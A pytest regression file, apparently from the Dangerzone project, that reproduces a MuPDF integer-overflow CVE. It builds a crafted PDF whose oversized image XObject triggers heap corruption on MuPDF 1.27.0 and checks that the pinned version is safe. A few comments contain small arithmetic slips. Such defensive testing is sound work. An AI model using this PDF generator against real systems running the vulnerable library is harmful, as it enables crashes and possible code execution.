"""
CVE-2026-3308 reproduction test for MuPDF integer overflow in fz_unpack_stream().

VULNERABILITY
=============
MuPDF 1.27.0 contains an integer overflow in source/fitz/draw-unpack.c:

    // VULNERABLE (MuPDF 1.27.0):
    int src_stride = (w * depth * n + 7) >> 3;

When a PDF image XObject has dimensions that cause w * depth * n to exceed
INT_MAX (2^31 - 1), the 32-bit multiplication wraps negative. This leads to
a small heap allocation followed by an out-of-bounds write when the image
stream is unpacked.

    // FIXED (MuPDF 1.27.1+):
    int src_stride = ((int64_t)w * depth * n + 7) >> 3;

TRIGGER
=======
A PDF containing an image XObject with:
    /Width 33554432  /Height 1  /BitsPerComponent 16  /ColorSpace /DeviceCMYK

Arithmetic: w=33554432, depth=16, n=4 (CMYK channels)
    w * depth * n = 33554432 * 16 * 4 = 2,147,483,648 = 2^31
This overflows signed 32-bit int to -2147483648 (or 0 on unsigned wrap),
causing a near-zero allocation followed by heap corruption.

DANGERZONE IMPACT
=================
Dangerzone uses PyMuPDF to convert untrusted documents inside a container.
If dangerzone shipped PyMuPDF 1.27.0 (which embeds MuPDF 1.27.0), an
attacker-crafted PDF could escape the document-to-pixel conversion and
potentially achieve code execution within the container.

Dangerzone currently pins PyMuPDF 1.26.x which uses MuPDF 1.26.x (NOT
affected). This test exists to:
1. Verify the vulnerability is real on affected versions
2. Confirm dangerzone's pinned version is safe
3. Catch future upgrades that might introduce the vulnerable range

REFERENCES
==========
- Fix commit: ArtifexSoftware/mupdf@a26f014
- CVSS 7.8 (High) - local attack, low complexity, no privileges required
- Affects: MuPDF 1.27.0 (PyMuPDF 1.27.0)
- Fixed in: MuPDF 1.27.1 (PyMuPDF 1.27.1+)

USAGE
=====
    # With current dangerzone PyMuPDF (should pass - not vulnerable):
    uvx --with PyMuPDF pytest tests/test_cve_2026_3308.py -v --no-header

    # Reproduce on vulnerable version:
    uvx --with PyMuPDF==1.27.0 pytest tests/test_cve_2026_3308.py -v --no-header
"""

from __future__ import annotations

from typing import Optional, Tuple

import pytest

try:
    import fitz

    HAS_FITZ = True
    FITZ_VERSION: Optional[str] = fitz.__version__
except ImportError:
    HAS_FITZ = False
    FITZ_VERSION = None

pytestmark = pytest.mark.skipif(not HAS_FITZ, reason="PyMuPDF (fitz) not installed")


# ---------------------------------------------------------------------------
# PDF construction helpers
# ---------------------------------------------------------------------------


def _make_obj(obj_num: int, content: bytes) -> bytes:
    """Wrap content as a PDF indirect object."""
    header = f"{obj_num} 0 obj\n".encode()
    footer = b"\nendobj\n"
    return header + content + footer


def _make_stream_obj(obj_num: int, dictionary: bytes, stream_data: bytes) -> bytes:
    """Wrap content as a PDF stream object."""
    header = f"{obj_num} 0 obj\n".encode()
    dict_with_length = (
        dictionary.rstrip(b">") + f" /Length {len(stream_data)} >>".encode()
    )
    return (
        header
        + dict_with_length
        + b"\nstream\n"
        + stream_data
        + b"\nendstream\nendobj\n"
    )


def make_cve_2026_3308_pdf(
    width: int = 33554432,
    height: int = 1,
    bits_per_component: int = 16,
    colorspace: str = "/DeviceCMYK",
) -> bytes:
    """Build a minimal PDF with a crafted image XObject that triggers
    integer overflow in fz_unpack_stream when w * depth * n > INT_MAX.

    The PDF structure:
        obj 1: Catalog
        obj 2: Pages
        obj 3: Page (references image as XObject)
        obj 4: Contents stream (draws the image)
        obj 5: Image XObject (the payload)
    """
    offsets: list[int] = []
    body = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"  # header + high-byte comment

    # obj 1: Catalog
    obj1 = _make_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    offsets.append(len(body))
    body += obj1

    # obj 2: Pages
    obj2 = _make_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    offsets.append(len(body))
    body += obj2

    # obj 3: Page
    page_dict = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
        b"   /Contents 4 0 R /Resources << /XObject << /Img 5 0 R >> >> >>"
    )
    obj3 = _make_obj(3, page_dict)
    offsets.append(len(body))
    body += obj3

    # obj 4: Contents stream - draw the image
    content_stream = b"q 100 0 0 100 0 0 cm /Img Do Q"
    obj4 = _make_stream_obj(4, b"<<", content_stream)
    offsets.append(len(body))
    body += obj4

    # obj 5: Image XObject - THE PAYLOAD
    # Minimal stream data (1 byte) - MuPDF will try to unpack this according
    # to the declared dimensions, triggering the overflow in stride calculation
    image_dict = (
        f"<< /Type /XObject /Subtype /Image\n"
        f"   /Width {width} /Height {height}\n"
        f"   /BitsPerComponent {bits_per_component} /ColorSpace {colorspace}"
    ).encode()
    # Provide a tiny stream - the overflow happens before MuPDF reads stream data
    image_stream = b"\x00" * 8
    obj5 = _make_stream_obj(5, image_dict, image_stream)
    offsets.append(len(body))
    body += obj5

    # Cross-reference table
    xref_offset = len(body)
    xref = b"xref\n"
    xref += f"0 {len(offsets) + 1}\n".encode()
    xref += b"0000000000 65535 f \n"
    for off in offsets:
        xref += f"{off:010d} 00000 n \n".encode()

    # Trailer
    trailer = (
        f"trailer\n<< /Size {len(offsets) + 1} /Root 1 0 R >>\n"
        f"startxref\n{xref_offset}\n%%EOF\n"
    ).encode()

    return body + xref + trailer


def _parse_fitz_version(version_str: str) -> Tuple[int, ...]:
    """Parse fitz version string like '1.27.0' into tuple (1, 27, 0)."""
    parts = version_str.split(".")
    return tuple(int(p) for p in parts[:3])


def _is_vulnerable_version() -> bool:
    """Check if current PyMuPDF embeds the vulnerable MuPDF 1.27.0."""
    if not HAS_FITZ:
        return False
    try:
        ver = _parse_fitz_version(fitz.__version__)
        # PyMuPDF 1.27.0.x embeds MuPDF 1.27.0 (vulnerable)
        # PyMuPDF 1.27.1+ embeds MuPDF 1.27.1+ (fixed)
        # PyMuPDF 1.26.x embeds MuPDF 1.26.x (not affected)
        return ver[:3] == (1, 27, 0)
    except (ValueError, AttributeError):
        return False


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestCVE20263308:
    """Test suite for CVE-2026-3308: MuPDF fz_unpack_stream integer overflow."""

    def test_pdf_is_parseable(self):
        """Verify the crafted PDF is valid enough for MuPDF to open."""
        pdf_bytes = make_cve_2026_3308_pdf()
        doc = fitz.open(stream=pdf_bytes, filetype="pdf")
        assert doc.page_count == 1
        page = doc[0]
        # The page should exist and have our image reference
        # Verify the page loads (image XObject may be reported differently
        # depending on version, but the page itself should be parseable)
        page.get_images()
        doc.close()

    def test_overflow_arithmetic(self):
        """Verify the integer overflow arithmetic independent of MuPDF.

        This documents WHY the chosen dimensions trigger the bug:
        w * depth * n must exceed INT_MAX (2^31 - 1 = 2147483647).
        """
        w = 33554432  # 2^25
        depth = 16
        n = 4  # CMYK channels

        product = w * depth * n
        assert product == 2**31, f"Expected 2^31, got {product}"
        assert product > 2**31 - 1, "Product must exceed INT_MAX"

        # In C with 32-bit signed int, this wraps to -2147483648 or 0
        # depending on compiler behavior (signed overflow is UB in C)
        c_int32 = product & 0xFFFFFFFF
        if c_int32 >= 0x80000000:
            c_int32 -= 0x100000000  # interpret as signed
        assert c_int32 == -2147483648, f"Expected -2^31 signed wrap, got {c_int32}"

        # The stride calculation (product + 7) >> 3 with overflow:
        # (-2147483648 + 7) >> 3 = -2147483641 >> 3 = -268435456 (arithmetic shift)
        # A negative stride means near-zero or negative allocation size

    def test_render_crafted_image(self):
        """Attempt to render the crafted PDF page.

        On VULNERABLE versions (PyMuPDF 1.27.0 / MuPDF 1.27.0):
            Expected: crash (SIGSEGV/SIGBUS), MemoryError, or RuntimeError
            from the heap corruption in fz_unpack_stream.

        On SAFE versions (PyMuPDF 1.26.x or 1.27.1+):
            Expected: graceful error (RuntimeError, ValueError) or
            successful render (if MuPDF handles oversized images gracefully).
        """
        pdf_bytes = make_cve_2026_3308_pdf()
        doc = fitz.open(stream=pdf_bytes, filetype="pdf")
        page = doc[0]

        if _is_vulnerable_version():
            # On vulnerable MuPDF, rendering should crash or raise
            with pytest.raises((RuntimeError, MemoryError, SystemError, OSError)):
                page.get_pixmap()
        else:
            # On safe versions, we accept either:
            # - A graceful exception (expected for absurd dimensions)
            # - Successful rendering (if MuPDF clamps/ignores the image)
            try:
                pixmap = page.get_pixmap()
                # If we get here, MuPDF handled it gracefully
                assert pixmap is not None
            except (RuntimeError, MemoryError, ValueError, OSError):
                pass  # Standard Python exceptions from MuPDF
            except Exception as exc:
                # PyMuPDF's SWIG bindings raise FzErrorSystem/FzErrorBase which
                # inherit directly from Exception (not RuntimeError). These are
                # graceful rejections — MuPDF caught the problem.
                if "mupdf" in type(exc).__module__ or "pymupdf" in type(exc).__module__:
                    pass
                else:
                    raise

        doc.close()

    def test_dangerzone_bounds_prevent_overflow(self):
        """Verify that dangerzone's dimension bounds (10000x10000) make the
        overflow unreachable for any colorspace.

        The overflow requires w * depth * n > INT_MAX (2^31 - 1).
        With MAX_PAGE_WIDTH=10000:
            - RGB:  10000 * 8 * 3 = 240,000           (safe)
            - CMYK: 10000 * 16 * 4 = 640,000          (safe)
            - Max:  10000 * 16 * 4 = 640,000           (safe)

        Even the worst case is 3 orders of magnitude below INT_MAX.
        """
        MAX_PAGE_WIDTH = 10_000
        INT_MAX = 2**31 - 1

        # Test all standard colorspace/depth combinations
        configs = [
            ("RGB 8-bit", 8, 3),
            ("RGB 16-bit", 16, 3),
            ("CMYK 8-bit", 8, 4),
            ("CMYK 16-bit", 16, 4),
            ("Gray 8-bit", 8, 1),
            ("Gray 16-bit", 16, 1),
        ]

        for name, depth, channels in configs:
            stride = MAX_PAGE_WIDTH * depth * channels
            margin = INT_MAX / stride
            assert stride < INT_MAX, (
                f"{name}: w*depth*n = {stride} exceeds INT_MAX ({INT_MAX})"
            )
            assert margin > 1000, (
                f"{name}: safety margin is only {margin:.0f}x (expected >1000x)"
            )

    @pytest.mark.parametrize(
        "width,height,bpc,cs,desc",
        [
            # Boundary cases that are close to but below overflow
            (16777216, 1, 16, "/DeviceCMYK", "w*16*4 = 2^30 (half of INT_MAX)"),
            (33554432, 1, 16, "/DeviceCMYK", "w*16*4 = 2^31 (exact overflow)"),
            (89478485, 1, 8, "/DeviceRGB", "w*8*3 = 2^31-7 (just below overflow)"),
            (1, 1, 8, "/DeviceRGB", "minimal safe image"),
        ],
        ids=["half-intmax", "exact-overflow", "near-overflow-rgb", "minimal"],
    )
    def test_crafted_dimensions(self, width, height, bpc, cs, desc):  # noqa: ARG002
        """Test various dimension combinations near the overflow boundary."""
        pdf_bytes = make_cve_2026_3308_pdf(
            width=width, height=height, bits_per_component=bpc, colorspace=cs
        )
        doc = fitz.open(stream=pdf_bytes, filetype="pdf")
        page = doc[0]

        # All of these should either render safely or raise a graceful error.
        # None should cause a segfault on non-vulnerable versions.
        try:
            page.get_pixmap()
        except (RuntimeError, MemoryError, ValueError, OSError):
            pass  # Standard Python exceptions from MuPDF
        except Exception as exc:
            if "mupdf" in type(exc).__module__ or "pymupdf" in type(exc).__module__:
                pass  # PyMuPDF SWIG exceptions (FzErrorSystem, etc.)
            else:
                raise

        doc.close()

    def test_version_detection(self):
        """Sanity check: version detection works."""
        ver = _parse_fitz_version(fitz.__version__)
        assert len(ver) >= 3
        assert all(isinstance(v, int) for v in ver)
        # Log for visibility in test output
        vulnerable = _is_vulnerable_version()
        status = "VULNERABLE" if vulnerable else "safe"
        print(f"\nPyMuPDF {fitz.__version__} -> MuPDF status: {status}")
